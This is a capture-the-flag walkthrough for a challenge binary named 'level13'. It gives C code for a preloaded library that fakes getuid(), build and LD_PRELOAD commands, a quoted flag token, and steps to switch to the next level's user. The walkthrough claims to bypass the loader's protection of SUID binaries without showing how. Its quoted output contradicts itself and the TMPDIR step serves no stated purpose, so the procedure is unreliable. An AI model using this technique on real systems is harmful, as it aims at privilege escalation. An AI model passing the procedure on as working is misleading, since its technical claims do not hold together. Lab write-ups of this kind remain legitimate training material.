# Level13

## Objective
Exploit the `level13` binary to execute it with a modified UID using LD_PRELOAD and bypass the SUID binary preload protection.

## Steps

### Step 1: Create Fake UID Library
Create a C file named `fake_uid.c` with the following content:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

uid_t getuid(void) {
    return 4242;
}
```

Compile the library into a shared object file:

```bash
gcc -fPIC -shared -o /tmp/fake_uid.so /tmp/fake_uid.c -nostartfiles
```

### Step 2: Set TMPDIR and LD_PRELOAD
Set the `TMPDIR` environment variable to `/run/shm` and the `LD_PRELOAD` environment variable to the path of the fake UID library:

```bash
export TMPDIR=/run/shm
export LD_PRELOAD="/tmp/fake_uid.so"
```

### Step 3: Check Library Loading
Check that the library is loaded with `ldd`:

```bash
ldd level13
```

### Step 4: Run the Exploit
Run the `level13` binary to exploit it:

```bash
./level13
```

### Step 5: Obtain Flag
If successful, the output should include the flag:

```
UID 4242 started us but we expect 4242
2A31L79asukciNyi8uppkEuSx
```

### Step 6: Switch to `level14`
Switch to the `level14` user:

```bash
su level14
```

### Step 7: Verify
Execute `getflag` to verify that you have access:

```bash
getflag
```

This should give you the flag for this level.

Congratulations! You've successfully exploited the `level13` binary to obtain the token for `level14`.